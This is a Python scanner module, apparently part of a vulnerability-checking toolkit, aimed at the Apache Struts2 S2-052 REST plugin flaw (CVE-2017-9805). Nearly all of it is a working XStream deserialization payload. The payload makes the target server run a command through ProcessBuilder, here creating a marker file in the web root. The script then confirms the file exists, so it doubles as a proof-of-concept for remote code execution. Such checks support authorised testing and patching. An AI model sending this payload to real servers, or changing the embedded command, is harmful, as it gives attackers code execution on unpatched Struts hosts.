import requests
from urllib.parse import urlparse
requests.packages.urllib3.disable_warnings()

name = 'Apache Struts2 S2-052 REST插件远程代码执行漏洞 (CVE-2017-9805)'


def run(url):
    headers = {
    'Content-Type':'application/xml',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
    }
    try:
        postdata = """<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>touch</string>
                        <string>webapps/ROOT/testlv401.txt</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>"""
        response = requests.post(url, headers=headers, data=postdata, timeout=15, verify=False)
        if 'version' in response.text:
            vulurl = url + '/testlv401.txt'
            response = requests.get(vulurl, headers=headers, timeout=15, verify=False)
            if response.status_code == 200:
                return ['True',name,vulurl]
        else:
            host = urlparse(url)
            url = f"{host.scheme}://{host.netloc}"
            try:
                vulurl = url + '/orders.xhtml'
                response = requests.post(vulurl, headers=headers, data=postdata, timeout=15, verify=False)
                if 'version' in response.text:
                    vulurl = url + '/testlv401.txt'
                    response = requests.get(vulurl, headers=headers, timeout=15, verify=False)
                    if response.status_code == 200:
                        return ['True',name,vulurl]
                else:
                    return ['False',name]
            except Exception as e:
                return ['False',name]

    except Exception as e:
        return ['False',name]
    
if __name__ == '__main__':
    url = ''
    print(run(url))